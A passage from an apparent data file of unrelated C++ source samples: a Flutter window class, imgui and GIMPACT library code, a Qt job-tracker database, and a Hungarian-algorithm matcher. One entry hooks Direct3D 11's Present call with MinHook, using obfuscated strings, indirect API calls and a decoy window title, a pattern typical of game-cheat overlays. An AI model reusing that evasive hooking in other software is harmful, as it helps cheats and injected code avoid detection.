0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "// dear imgui, v1.85 WIP\n// (widgets code)\n\n/*\n\nIndex of this file:\n\n// [SECTION] Forward Declarations\n// [SECTION] Widgets: Text, etc.\n// [SECTION] Widgets: Main (Button, Image, Checkbox, RadioButton, ProgressBar, Bullet, etc.)\n// [SECTION] Widgets: Low-level Layout helpers (Spacing, Dummy, NewLine, Separator, etc.)\n// [SECTION] Widgets: ComboBox\n// [SECTION] Data Type and Data Formatting Helpers\n// [SECTION] Widgets: DragScalar, DragFloat, DragInt, etc.\n// [SECTION] Widgets: SliderScalar, SliderFloat, SliderInt, etc.\n// [SECTION] Widgets: InputScalar, InputFloat, InputInt, etc.\n// [SECTION] Widgets: InputText, InputTextMultiline\n// [SECTION] Widgets: ColorEdit, ColorPicker, ColorButton, etc.\n// [SECTION] Widgets: TreeNode, CollapsingHeader, etc.\n// [SECTION] Widgets: Selectable\n// [SECTION] Widgets: ListBox\n// [SECTION] Widgets: PlotLines, PlotHistogram\n// [SECTION] Widgets: Value helpers\n// [SECTION] Widgets: MenuItem, BeginMenu, EndMenu, etc.\n// [SECTION] Widgets: BeginTabBar, EndTabBar, etc.\n// [SECTION] Widgets: BeginTabItem, EndTabItem, etc.\n// [SECTION] Widgets: Columns, BeginColumns, EndColumns, etc.\n\n*/\n\n#if defined(_MSC_VER) && !defined(_CRT_SECURE_NO_WARNINGS)\n#define _CRT_SECURE_NO_WARNINGS\n#endif\n\n#include \"imgui.h\"\n#ifndef IMGUI_DISABLE\n\n#ifndef IMGUI_DEFINE_MATH_OPERATORS\n#define IMGUI_DEFINE_MATH_OPERATORS\n#endif\n#include \"imgui_internal.h\"\n\n// System includes\n#include <ctype.h>      // toupper\n#if defined(_MSC_VER) && _MSC_VER <= 1500 // MSVC 2008 or earlier\n#include <stddef.h>     // intptr_t\n#else\n#include <stdint.h>     // intptr_t\n#endif\n#include <map>\n\n//-------------------------------------------------------------------------\n// Warnings\n//-------------------------------------------------------------------------\n\n// Visual Studio warnings\n#ifdef _MSC_VER\n#pragma warning (disable: 4127)     // condition expression is constant\n#pragma warning (disable: 4996)     // 'This function or variable may be unsafe': strcpy, strdup, sprintf, vsnprintf, sscanf, fopen\n#if defined(_MSC_VER) && _MSC_VER >= 1922 // MSVC 2019 16.2 or later\n#pragma warning (disable: 5054)     // operator '|': deprecated between enumerations of different types\n#endif\n#pragma warning (disable: 26451)    // [Static Analyzer] Arithmetic overflow : Using operator 'xxx' on a 4 byte value and then casting the result to a 8 byte value. Cast the value to the wider type before calling operator 'xxx' to avoid overflow(io.2).\n#pragma warning (disable: 26812)    // [Static Analyzer] The enum type 'xxx' is unscoped. Prefer 'enum class' over 'enum' (Enum.3).\n#endif\n\n// Clang/GCC warnings with -Weverything\n#if defined(__clang__)\n#if __has_warning(\"-Wunknown-warning-option\")\n#pragma clang diagnostic ignored \"-Wunknown-warning-option\"         // warning: unknown warning group 'xxx'                      // not all warnings are known by all Clang versions and they tend to be rename-happy.. so ignoring warnings triggers new warnings on some configuration. Great!\n#endif\n#pragma clang diagnostic ignored \"-Wunknown-pragmas\"                // warning: unknown warning group 'xxx'\n#pragma clang diagnostic ignored \"-Wold-style-cast\"                 // warning: use of old-style cast                            // yes, they are more terse.\n#pragma clang diagnostic ignored \"-Wfloat-equal\"                    // warning: comparing floating point with == or != is unsafe // storing and comparing against same constants (typically 0.0f) is ok.\n#pragma clang diagnostic ignored \"-Wformat-nonliteral\"              // warning: format string is not a string literal            // passing non-literal to vsnformat(). yes, user passing incorrect format strings can crash the code.\n#pragma clang diagnostic ignored \"-Wsign-conversion\"                // warning: implicit conversion changes signedness\n#pragma clang diagnostic ignored \"-Wzero-as-null-pointer-constant\"  // warning: zero as null pointer constant                    // some standard header variations use #define NULL 0\n#pragma clang diagnostic ignored \"-Wdouble-promotion\"               // warning: implicit conversion from 'float' to 'double' when passing argument to function  // using printf() is a misery with this as C++ va_arg ellipsis changes float to double.\n#pragma clang diagnostic ignored \"-Wenum-enum-conversion\"           // warning: bitwise operation between different enumeration types ('XXXFlags_' and 'XXXFlagsPrivate_')\n#pragma clang diagnostic ignored \"-Wdeprecated-enum-enum-conversion\"// warning: bitwise operation between different enumeration types ('XXXFlags_' and 'XXXFlagsPrivate_') is deprecated\n#pragma clang diagnostic ignored \"-Wimplicit-int-float-conversion\"  // warning: implicit conversion from 'xxx' to 'float' may lose precision\n#elif defined(__GNUC__)\n#pragma GCC diagnostic ignored \"-Wpragmas\"                          // warning: unknown option after '#pragma GCC diagnostic' kind\n#pragma GCC diagnostic ignored \"-Wformat-nonliteral\"                // warning: format not a string literal, ",
    "#include \"../headers/database_manager.hpp\"\n\nDatabaseManager::DatabaseManager(QWidget *parent) {\n    this->parent = parent;\n    model = new QSqlQueryModel();\n}\n\nvoid DatabaseManager::createDatabaseBackup(const QString& backupFilePath) {\n    if (db.isOpen()) {\n        db.close();\n    }\n    QFile::remove(backupFilePath);\n    QFile::copy(db.databaseName(), backupFilePath);\n    if (!db.open()) {\n        QMessageBox::critical(parent, \"Error\", \"Failed to reopen database after creating backup\");\n        return;\n    }\n}\n\nbool DatabaseManager::openDatabase(const QString& filePath, bool autoBackup) {\n    db = QSqlDatabase::addDatabase(\"QSQLITE\");\n    db.setDatabaseName(filePath);\n    bool ok = db.open();\n    if (ok && autoBackup) {\n        createDatabaseBackup(filePath + \".bak\");\n    }\n    return ok;\n}\n\nvoid DatabaseManager::loadModel() {\n    model->setQuery(\"SELECT * FROM jobs\");\n    if (model->lastError().isValid()) {\n        QMessageBox::critical(parent, \"Error\", \"Error: \" + model->lastError().text());\n    }\n}\n\nvoid DatabaseManager::closeDatabase() {\n    db.close();\n    QSqlDatabase::removeDatabase(\"QSQLITE\");\n}\n\nbool DatabaseManager::createJobsTableIfNotExists() {\n    QSqlQuery query(db);\n    return query.exec(\"CREATE TABLE IF NOT EXISTS jobs (\"\n                      \"id INTEGER PRIMARY KEY AUTOINCREMENT,\"\n                      \"job_title TEXT,\"\n                      \"company TEXT,\"\n                      \"status TEXT,\"\n                      \"application_date TEXT,\"\n                      \"url_email TEXT,\"\n                      \"details TEXT,\"\n                      \"is_finished BOOLEAN DEFAULT 0\"\n                      \");\");\n}\n\nvoid DatabaseManager::updateStatus(int id, const QString& status) {\n    {\n        QSqlQuery query(db);\n        query.prepare(\"UPDATE jobs SET status = :status, is_finished = :is_finished WHERE id = :id\");\n        query.bindValue(\":status\", status);\n        query.bindValue(\":id\", id);\n        static std::vector<QString> finishedStatus = {\"Finished\", \"Done\", \"Complete\", \"Rejected\", \"Approved\"};\n        bool isFinished = std::find(finishedStatus.begin(), finishedStatus.end(), status) != finishedStatus.end();\n        query.bindValue(\":is_finished\", isFinished);\n        if (!query.exec()) {\n            QMessageBox::critical(parent, \"Error\", \"Failed to update status\");\n            return;\n        }\n    }\n    loadModel();\n    QMessageBox::information(parent, \"Success\", \"Status updated successfully\");\n}\n\nvoid DatabaseManager::exportDatabase() {\n    QString fileName = QFileDialog::getSaveFileName(nullptr, \"Export Database\", QDir::homePath() + \"/database.db\", \"SQLite Database (*.db)\");\n    if (fileName.isEmpty()) {\n        return;\n    }\n    QFile file(fileName);\n    if (file.exists()) {\n        if (!file.remove()) {\n            QMessageBox::critical(parent, \"Error\", \"Error: Failed to remove existing file.\");\n            return;\n        }\n    }\n    QSqlDatabase exportDb = QSqlDatabase::addDatabase(\"QSQLITE\", \"export\");\n    exportDb.setDatabaseName(fileName);\n    if (!exportDb.open()) {\n        QMessageBox::critical(parent, \"Error\", \"Error: \" + exportDb.lastError().text());\n        return;\n    }\n    {\n        QSqlQuery createTableQuery(exportDb);\n        if (!createTableQuery.exec(\"CREATE TABLE IF NOT EXISTS jobs (\"\n                                   \"id INTEGER PRIMARY KEY AUTOINCREMENT,\"\n                                   \"job_title TEXT,\"\n                                   \"company TEXT,\"\n                                   \"status TEXT,\"\n                                   \"application_date TEXT,\"\n                                   \"url_email TEXT,\"\n                                   \"details TEXT,\"\n                                   \"is_finished BOOLEAN DEFAULT 0\"\n                                   \");\")) {\n            QMessageBox::critical(parent, \"Error\", \"Error: \" + createTableQuery.lastError().text());\n            exportDb.close();\n            return;\n        }\n        QSqlQuery insertQuery(exportDb);\n        for (int row = 0; row < model->rowCount(); ++row) {\n            QSqlRecord record = model->record(row);\n            insertQuery.prepare(\"INSERT INTO jobs (job_title, company, status, application_date, url_email, details, is_finished) \"\n                                \"VALUES (:job_title, :company, :status, :application_date, :url_email, :details, :is_finished)\");\n            insertQuery.bindValue(\":job_title\", record.value(\"job_title\"));\n            insertQuery.bindValue(\":company\", record.value(\"company\"));\n            insertQuery.bindValue(\":status\", record.value(\"status\"));\n            insertQuery.bindValue(\":application_date\", record.value(\"application_date\"));\n            insertQuery.bindValue(\":url_email\", record.value(\"url_email\"));\n            insertQuery.bindValue(\":details\", record.value(\"details\"));\n            insertQuery.bindValue(\":is_finished\", record.value(\"is_finished\"));\n            if (!insertQuery.exec()) {\n                QMessageBox::critical(parent, \"Error\", \"Error: \" +",
    "\n/*\n-----------------------------------------------------------------------------\nThis source file is part of GIMPACT Library.\n\nFor the latest info, see http://gimpact.sourceforge.net/\n\nCopyright (c) 2006 Francisco Leon Najera. C.C. 80087371.\nemail: projectileman@yahoo.com\n\n This library is free software; you can redistribute it and/or\n modify it under the terms of EITHER:\n   (1) The GNU Lesser General Public License as published by the Free\n       Software Foundation; either version 2.1 of the License, or (at\n       your option) any later version. The text of the GNU Lesser\n       General Public License is included with this library in the\n       file GIMPACT-LICENSE-LGPL.TXT.\n   (2) The BSD-style license that is included with this library in\n       the file GIMPACT-LICENSE-BSD.TXT.\n   (3) The zlib/libpng license that is included with this library in\n       the file GIMPACT-LICENSE-ZLIB.TXT.\n\n This library is distributed in the hope that it will be useful,\n but WITHOUT ANY WARRANTY; without even the implied warranty of\n MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the files\n GIMPACT-LICENSE-LGPL.TXT, GIMPACT-LICENSE-ZLIB.TXT and GIMPACT-LICENSE-BSD.TXT for more details.\n\n-----------------------------------------------------------------------------\n*/\n\n#include \"gim_contact.h\"\n\n#define MAX_COINCIDENT 8\n\nvoid gim_contact_array::merge_contacts(\n\tconst gim_contact_array& contacts, bool normal_contact_average)\n{\n\tclear();\n\n\tif (contacts.size() == 1)\n\t{\n\t\tpush_back(contacts.back());\n\t\treturn;\n\t}\n\n\tgim_array<GIM_RSORT_TOKEN> keycontacts(contacts.size());\n\tkeycontacts.resize(contacts.size(), false);\n\n\t//fill key contacts\n\n\tGUINT i;\n\n\tfor (i = 0; i < contacts.size(); i++)\n\t{\n\t\tkeycontacts[i].m_key = contacts[i].calc_key_contact();\n\t\tkeycontacts[i].m_value = i;\n\t}\n\n\t//sort keys\n\tgim_heap_sort(keycontacts.pointer(), keycontacts.size(), GIM_RSORT_TOKEN_COMPARATOR());\n\n\t// Merge contacts\n\n\tGUINT coincident_count = 0;\n\tbtVector3 coincident_normals[MAX_COINCIDENT];\n\n\tGUINT last_key = keycontacts[0].m_key;\n\tGUINT key = 0;\n\n\tpush_back(contacts[keycontacts[0].m_value]);\n\tGIM_CONTACT* pcontact = &back();\n\n\tfor (i = 1; i < keycontacts.size(); i++)\n\t{\n\t\tkey = keycontacts[i].m_key;\n\t\tconst GIM_CONTACT* scontact = &contacts[keycontacts[i].m_value];\n\n\t\tif (last_key == key)  //same points\n\t\t{\n\t\t\t//merge contact\n\t\t\tif (pcontact->m_depth - CONTACT_DIFF_EPSILON > scontact->m_depth)  //)\n\t\t\t{\n\t\t\t\t*pcontact = *scontact;\n\t\t\t\tcoincident_count = 0;\n\t\t\t}\n\t\t\telse if (normal_contact_average)\n\t\t\t{\n\t\t\t\tif (btFabs(pcontact->m_depth - scontact->m_depth) < CONTACT_DIFF_EPSILON)\n\t\t\t\t{\n\t\t\t\t\tif (coincident_count < MAX_COINCIDENT)\n\t\t\t\t\t{\n\t\t\t\t\t\tcoincident_normals[coincident_count] = scontact->m_normal;\n\t\t\t\t\t\tcoincident_count++;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\telse\n\t\t{  //add new contact\n\n\t\t\tif (normal_contact_average && coincident_count > 0)\n\t\t\t{\n\t\t\t\tpcontact->interpolate_normals(coincident_normals, coincident_count);\n\t\t\t\tcoincident_count = 0;\n\t\t\t}\n\n\t\t\tpush_back(*scontact);\n\t\t\tpcontact = &back();\n\t\t}\n\t\tlast_key = key;\n\t}\n}\n\nvoid gim_contact_array::merge_contacts_unique(const gim_contact_array& contacts)\n{\n\tclear();\n\n\tif (contacts.size() == 1)\n\t{\n\t\tpush_back(contacts.back());\n\t\treturn;\n\t}\n\n\tGIM_CONTACT average_contact = contacts.back();\n\n\tfor (GUINT i = 1; i < contacts.size(); i++)\n\t{\n\t\taverage_contact.m_point += contacts[i].m_point;\n\t\taverage_contact.m_normal += contacts[i].m_normal * contacts[i].m_depth;\n\t}\n\n\t//divide\n\tGREAL divide_average = 1.0f / ((GREAL)contacts.size());\n\n\taverage_contact.m_point *= divide_average;\n\n\taverage_contact.m_normal *= divide_average;\n\n\taverage_contact.m_depth = average_contact.m_normal.length();\n\n\taverage_contact.m_normal /= average_contact.m_depth;\n}\n",
    "#include \"d3d_Hook.hpp\"\r\n\r\n#include <MinHook.h>\r\n\r\nbool Hook::Init()\r\n{\r\n\tconst std::string Title = E(\"SKYPE TERMINAL CALLING\");\r\n\r\n\tWNDCLASSEX Window;\r\n\r\n\tWindow.cbSize = sizeof(WNDCLASSEX);\r\n\tWindow.style = CS_HREDRAW | CS_VREDRAW;\r\n\r\n\tWindow.lpfnWndProc = DefWindowProcA;\r\n\tWindow.cbClsExtra = NULL;\r\n\tWindow.cbWndExtra = NULL;\r\n\tWindow.hInstance = SAFE_CALL(GetModuleHandleA)(nullptr);\r\n\tWindow.hIcon = NULL;\r\n\tWindow.hCursor = NULL;\r\n\tWindow.hbrBackground = NULL;\r\n\tWindow.lpszMenuName = NULL;\r\n\tWindow.lpszClassName = Title.c_str();\r\n\tWindow.hIconSm = NULL;\r\n\r\n\tSAFE_CALL(RegisterClassExA)(&Window);\r\n\r\n\tHWND WindowA = CreateWindowA(Window.lpszClassName, Title.c_str(), WS_OVERLAPPEDWINDOW, 0, 0, 100, 100, 0, 0, Window.hInstance, 0);\r\n\r\n\tHMODULE D3D11_DLL;\r\n\tif ((D3D11_DLL = SAFE_CALL(GetModuleHandleA)(E(\"d3d11.dll\"))) == NULL)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tvoid* D3D11CreateDeviceAndSwapChain;\r\n\r\n\tif ((D3D11CreateDeviceAndSwapChain = SAFE_CALL(GetProcAddress)(D3D11_DLL, E(\"D3D11CreateDeviceAndSwapChain\"))) == NULL)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tD3D_FEATURE_LEVEL featureLevel;\r\n\tconst D3D_FEATURE_LEVEL featureLevels[] = { D3D_FEATURE_LEVEL_10_1, D3D_FEATURE_LEVEL_11_0 };\r\n\tDXGI_RATIONAL refreshRate;\r\n\trefreshRate.Numerator = 60;\r\n\trefreshRate.Denominator = 1;\r\n\r\n\tDXGI_MODE_DESC bufferDesc;\r\n\tbufferDesc.Width = 100;\r\n\tbufferDesc.Height = 100;\r\n\tbufferDesc.RefreshRate = refreshRate;\r\n\tbufferDesc.Format = DXGI_FORMAT_R8G8B8A8_UNORM;\r\n\tbufferDesc.ScanlineOrdering = DXGI_MODE_SCANLINE_ORDER_UNSPECIFIED;\r\n\tbufferDesc.Scaling = DXGI_MODE_SCALING_UNSPECIFIED;\r\n\r\n\tDXGI_SAMPLE_DESC sampleDesc;\r\n\tsampleDesc.Count = 1;\r\n\tsampleDesc.Quality = 0;\r\n\r\n\tDXGI_SWAP_CHAIN_DESC swapChainDesc;\r\n\tswapChainDesc.BufferDesc = bufferDesc;\r\n\tswapChainDesc.SampleDesc = sampleDesc;\r\n\tswapChainDesc.BufferUsage = DXGI_USAGE_RENDER_TARGET_OUTPUT;\r\n\tswapChainDesc.BufferCount = 1;\r\n\tswapChainDesc.OutputWindow = WindowA;\r\n\tswapChainDesc.Windowed = 1;\r\n\tswapChainDesc.SwapEffect = DXGI_SWAP_EFFECT_DISCARD;\r\n\tswapChainDesc.Flags = DXGI_SWAP_CHAIN_FLAG_ALLOW_MODE_SWITCH;\r\n\r\n\tIDXGISwapChain* swapChain;\r\n\tID3D11Device* device;\r\n\tID3D11DeviceContext* context;\r\n\r\n\tif (((long(__stdcall*)(\r\n\t\tIDXGIAdapter*,\r\n\t\tD3D_DRIVER_TYPE,\r\n\t\tHMODULE,\r\n\t\tUINT,\r\n\t\tconst D3D_FEATURE_LEVEL*,\r\n\t\tUINT,\r\n\t\tUINT,\r\n\t\tconst DXGI_SWAP_CHAIN_DESC*,\r\n\t\tIDXGISwapChain**,\r\n\t\tID3D11Device**,\r\n\t\tD3D_FEATURE_LEVEL*,\r\n\t\tID3D11DeviceContext**))(D3D11CreateDeviceAndSwapChain))(0, D3D_DRIVER_TYPE_HARDWARE, 0, 0, featureLevels, 2, D3D11_SDK_VERSION, &swapChainDesc, &swapChain, &device, &featureLevel, &context) < 0)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tg_methodsTable = (uint64_t*)calloc(205, sizeof(uint64_t));\r\n\r\n\tmemcpy(g_methodsTable, *(uint64_t**)swapChain, 18 * sizeof(uint64_t));\r\n\tmemcpy(g_methodsTable + 18, *(uint64_t**)device, 43 * sizeof(uint64_t));\r\n\tmemcpy(g_methodsTable + 18 + 43, *(uint64_t**)context, 144 * sizeof(uint64_t));\r\n\r\n\tMH_Initialize();\r\n\r\n\tswapChain->Release();\r\n\tswapChain = 0;\r\n\r\n\tdevice->Release();\r\n\tdevice = 0;\r\n\r\n\tcontext->Release();\r\n\tcontext = 0;\r\n\r\n\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\treturn true;\r\n}\r\n\r\nbool Hook::Present(void** hk_originalFunction, void* hk_hookedPresent)\r\n{\r\n\tif (!hk_originalFunction || !hk_hookedPresent)\r\n\t\treturn false;\r\n\r\n\tvoid* target = (void*)g_methodsTable[8];\r\n\r\n\tif (!target)\r\n\t\treturn false;\r\n\r\n\tif (MH_CreateHook(target, hk_hookedPresent, hk_originalFunction) != MH_OK || MH_EnableHook(target) != MH_OK)\r\n\t{\r\n\t\treturn false;\r\n\t}\r\n\r\n\treturn true;\r\n}",
    "//\n// Created by zss on 2024/3/14.\n//\n\n#include \"HungarianAlgorithm.h\"\n\nvector<pair<int, int>> HungarianAlgorithm::getMatchedRobotAndTarget() {\n    vector<pair<int, int>> ans;\n    for (auto& [rid, gid] : m_matchedRobot2Good) {\n        ans.emplace_back(rid, gid);\n    }\n    return ans;\n}\n\nvoid HungarianAlgorithm::init(const vector<tuple<double, int, int>>& tuplesWeightRobotTarget) {\n\n    // \u5efa\u7acb\u673a\u5668\u4eba\u4e0e\u8d27\u7269 \u5230 \u5185\u90e8\u4e0b\u6807 \u7684\u6620\u5c04\n    for (auto& [w, rid, gid] : tuplesWeightRobotTarget) {\n        if (!m_rid2idx.count(rid)) {\n            m_rid2idx[rid] = m_rid2idx.size();\n            m_idx2rid[m_idx2rid.size()] = rid;\n        }\n        if (!m_tid2idx.count(gid)) {\n            m_tid2idx[gid] = m_tid2idx.size();\n            m_idx2tid[m_idx2tid.size()] = gid;\n        }\n    }\n\n    m_numRobots = m_idx2rid.size();\n    m_numTargets = m_idx2tid.size();\n    m_maxNum = max(m_numRobots, m_numTargets);\n    m_INF = 1000000007.f;\n    m_sum = 0;\n    m_weights = vector<vector<double>>(m_maxNum, vector<double>(m_maxNum));\n    m_matchRobots = vector<int>(m_maxNum, -1);\n    m_matchTargets = vector<int>(m_maxNum, -1);\n    m_pre = vector<int>(m_maxNum);\n    m_visitedRobots = vector<bool>(m_maxNum);\n    m_visitedTargets = vector<bool>(m_maxNum);\n    m_lx = vector<double>(m_maxNum, -m_INF);\n    m_ly = vector<double>(m_maxNum);\n    m_slack = vector<double>(m_maxNum);\n\n    // \u6dfb\u52a0\u8fb9\u6743\n    for (auto& [w, rid, gid] : tuplesWeightRobotTarget) {\n        addEdge(m_rid2idx[rid], m_tid2idx[gid], w);\n    }\n\n}\n\nvoid HungarianAlgorithm::execute() {\n\n    for (int i = 0; i < m_maxNum; ++i) {\n        for (int j = 0; j < m_maxNum; ++j) {\n            m_lx[i] = max(m_lx[i], m_weights[i][j]);\n        }\n    }\n\n    for (int i = 0; i < m_maxNum; ++i) {\n        fill(m_slack.begin(), m_slack.end(), m_INF);\n        fill(m_visitedRobots.begin(), m_visitedRobots.end(), false);\n        fill(m_visitedTargets.begin(), m_visitedTargets.end(), false);\n        bfs(i);\n    }\n\n    for (int i = 0; i < m_maxNum; ++i) {\n        if (m_weights[i][m_matchRobots[i]] > 0) {\n            m_sum += m_weights[i][m_matchRobots[i]];\n        } else {\n            m_matchRobots[i] = -1;\n        }\n    }\n    for (int i = 0; i < m_numRobots; ++i) {\n//            cout << m_matchRobots[i] + 1 << \" \";\n        if (m_matchRobots[i] == -1) continue;\n//        cout << m_idx2rid[i] << \" -> \" << m_idx2gid[m_matchRobots[i]] << endl;\n        m_matchedRobot2Good[m_idx2rid[i]] = m_idx2tid[m_matchRobots[i]];\n        m_matchedGood2Robot[m_idx2tid[m_matchRobots[i]]] = m_idx2rid[i];\n    }\n//    cout << \"\\m_maxNum\";\n\n//    if (m_numRobots != m_matchedRobot2Good.size()) {\n//        cerr << \"[HungarianAlgorithm]: \u8f93\u5165 \" << m_numRobots << \" \u4e2a\u673a\u5668\u4eba, \"\n//        << m_numTargets << \" \u4e2a\u76ee\u6807, \u6210\u529f\u914d\u5bf9 \"\n//        << m_matchedRobot2Good.size() << \" \u4e2a\u673a\u5668\u4eba.\" << endl;\n//    }\n\n//    cerr << \"[HungarianAlgorithm]: \u4f18\u5316\u5f97\u5230\u7684\u603b\u6743\u91cd\u4e3a \" << m_sum << endl;\n\n}\n\nvoid HungarianAlgorithm::addEdge(int x, int y, double weight) {\n    m_weights[x][y] = fmax(weight, 0.f);\n}\n\nbool HungarianAlgorithm::check(int x) {\n    m_visitedTargets[x] = true;\n    if (m_matchTargets[x] != -1) {\n        m_que.push(m_matchTargets[x]);\n        m_visitedRobots[m_matchTargets[x]] = true;\n        return false;\n    }\n    while (x != -1) {\n        m_matchTargets[x] = m_pre[x];\n        swap(x, m_matchRobots[m_pre[x]]);\n    }\n    return true;\n}\n\nvoid HungarianAlgorithm::bfs(int x) {\n    while (!m_que.empty()) {\n        m_que.pop();\n    }\n    m_que.push(x);\n    m_visitedRobots[x] = true;\n    while (true) {\n        while (!m_que.empty()) {\n            int u = m_que.front();\n            m_que.pop();\n            for (int v = 0; v < m_maxNum; ++v) {\n                if (!m_visitedTargets[v]) {\n                    double delta = m_lx[u] + m_ly[v] - m_weights[u][v];\n                    if (m_slack[v] >= delta) {\n                        m_pre[v] = u;\n                        if (delta) {\n                            m_slack[v] = delta;\n                        } else if (check(v)) {\n                            return;\n                        }\n                    }\n                }\n            }\n        }\n        double cost = m_INF;\n        for (int i = 0; i < m_maxNum; ++i) {\n            if (!m_visitedTargets[i]) {\n                cost = min(cost, m_slack[i]);\n            }\n        }\n        for (int i = 0; i < m_maxNum; ++i) {\n            if (m_visitedRobots[i]) {\n                m_lx[i] -= cost;\n            }\n            if (m_visitedTargets[i]) {\n                m_ly[i] += cost;\n            } else {\n                m_slack[i] -= cost;\n            }\n        }\n        for (int i = 0; i < m_maxNum; ++i) {\n            if (!m_visitedTargets[i] && m_slack[i] == 0 && check(i)) {\n                return;\n            }\n        }\n    }\n}",
    "//\n// Created by Hypericats on 5/9/2024.\n//\n\n#include \"ConsoleInteractionHandler.h\"\n\nstd::vector<std::string> ConsoleInteractionHandler::getMath() {\n    std::vector<std::string> v;\n    std::cout << \"Enter equation line by line (type exit when done)\" << std::endl;\n    std::string str;\n    while (str != \"exit\") {\n        std::cout << \"Enter next equation :\" << std::endl;\n        std::cin >> str;\n        if (str == \"exit\") break;\n        v.emplace_back(str);\n    }\n    return v;\n}\n\n//typing equations in got looong\nstd::vector<std::string> ConsoleInteractionHandler::getMathFromFile(std::string filePath) {\n    std::ifstream f(filePath);\n    std::istream_iterator<std::string> start(f), end;\n    return std::vector<std::string>(start, end);\n}\n\nMatrixd* ConsoleInteractionHandler::parseMath(std::vector<std::string> math, std::vector<std::string>& variableOrder) {\n    variableOrder.clear();\n    int columnSize = math.size();\n    int rowSize;\n    Matrixd* matrixd = nullptr;\n    for (int j = 0; j < math.size(); j++) {\n        //std::cout << math.at(j) << std::endl;\n        std::string  equation = math.at(j);\n\n        //remove spaces so we don't need to worry about that\n        equation.erase(std::remove(equation.begin(), equation.end(), ' '), equation.end());\n        std::vector<std::string> results = Util::splitString(equation, '=');\n        std::string str = results.at(0);\n        //std::cout << results.at(0) << std::endl;\n        //std::cout << results.at(1) << std::endl;\n\n        //add + for every - so we can split at every +\n        for (int i = 0; i < str.size(); i++) {\n            if (str[i] == '-') {\n                str.insert(i, \"+\");\n                i++;\n            }\n        }\n        std::vector<std::string> components = Util::splitString(str, '+');\n        //initialization if not done already\n        if (j == 0) {\n            rowSize = getVarCount(str) + 1;\n            matrixd = new Matrixd(rowSize, columnSize);\n        }\n        for (std::string c : components) {\n            std::string variable;\n            double coef = 1.0;\n            parseComponent(variable, coef, c);\n            if (j == 0) variableOrder.emplace_back(variable);\n            //std::cout << \"Variable order : \" << std::endl;\n            //Util::printVec(variableOrder);\n            //std::cout << \"Index : \" << Util::indexOf(variable, variableOrder) << std::endl;\n            //std::cout << \"J : \" << j << std::endl;\n            //std::cout << \"coef : \" << coef << std::endl;\n            matrixd->set(Util::indexOf(variable, variableOrder), j, coef);\n            //std::cout << matrixd->toString();\n        }\n        matrixd->set(rowSize - 1, j, std::stod(results.at(1)));\n    }\n    return matrixd;\n}\n\nvoid ConsoleInteractionHandler::parseComponent(std::string& variable, double& coef, std::string component) {\n    //std::cout << component << std::endl;\n    for (int i = 0; i < component.size(); i++) {\n        if (isalpha(component[i])) {\n            variable = component[i];\n            component.erase(i);\n            break;\n        }\n    }\n    try {\n        coef = std::stod(component);\n    }\n    catch (std::exception& ignore) {\n        //this means that there was no coef therfore coef should be 1 which it already is as that is the initial value\n    }\n}\n\nint ConsoleInteractionHandler::getVarCount(std::string& str) {\n    int count = 0;\n    for (char cha : str) {\n        if (isalpha(cha)) count++;\n    }\n    return count;\n}\n\n",
